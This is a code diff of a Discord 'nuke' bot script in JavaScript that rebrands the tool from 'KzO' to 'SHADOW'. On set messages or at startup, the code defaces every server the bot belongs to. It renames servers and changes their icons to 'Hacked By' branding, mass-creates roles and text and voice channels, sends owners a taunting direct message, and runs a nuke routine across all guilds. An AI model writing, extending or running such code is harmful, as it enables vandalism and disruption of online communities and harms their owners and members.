@@ -34,14 +34,14 @@ LOka.on("message", message => {
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/468507316082180107/473637899678646273/JPEG_20180726_101808.jpg`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/523836179380961292/523837030195789844/14.gif`)
  
 }
 });
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked By KZO")
+LOka.user.setUsername("Hacked By SHADOW")
 
 
  
@@ -49,7 +49,7 @@ LOka.user.setUsername("Hacked By KZO")
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked By KZO`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -57,14 +57,14 @@ LOka.user.setGame(`Hacked By KZO`,'https://www.twitch.tv/hix')
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/468507316082180107/473637899678646273/JPEG_20180726_101808.jpg`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/523836179380961292/523837030195789844/14.gif`)
 })
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By KZO`)
+             m.setName(`Hacked By SHADOW`)
 })
 }
 });
@@ -73,7 +73,7 @@ LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/523836179380961292/523837030195789844/14.gif`)
  
 }
 });
@@ -84,197 +84,197 @@ LOka.on('message', message => {
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked By - KzO ,$",
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -289,51 +289,51 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
-m.createChannel('Hacked By - KzO ,$', 'text');
-m.createChannel('Hacked By - KzO ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
+m.createChannel('Hacked By - SHADOW ,$', 'text');
  
 })
 }
@@ -342,65 +342,64 @@ m.createChannel('Hacked By - KzO ,$', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
-m.createChannel('Hacked By - KzO ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
+m.createChannel('Hacked By - SHADOW ,$', 'voice');
  
  
 })
@@ -418,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - KzO ,$    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW ,$    A7LA MASA 3LAK ').catch(e => { return void e; });
  
  
  
@@ -437,9 +436,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked By - KzO ,$', 'text');
+    await guild.createChannel('Hacked By - SHADOW ,$', 'text');
  
-      await guild.createChannel('Hacked By - KzO ,$', 'voice');
+      await guild.createChannel('Hacked By - SHADOW ,$', 'voice');
  
  
  
@@ -449,7 +448,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by YzhF1");
+  console.log("Made by SHADOW");
   console.log("");
   console.log("-------------------------------------------------------------");
  
